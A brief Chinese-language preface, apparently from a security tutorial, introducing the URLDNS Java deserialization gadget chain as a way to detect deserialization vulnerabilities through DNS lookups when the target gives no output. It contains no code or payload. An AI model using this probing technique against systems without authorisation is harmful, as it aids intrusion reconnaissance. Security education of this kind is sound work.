前言

URLDNS利用链是一条很简单的链子，可以用来查看java反序列化是否存在反序列化漏洞，如果存在，就会触发dns查询请求

它有如下优点：

使用java内置类构造，对第三方库没有依赖

在目标没有回显的时候，可以使用DNS请求得知是否存在反序列化漏洞
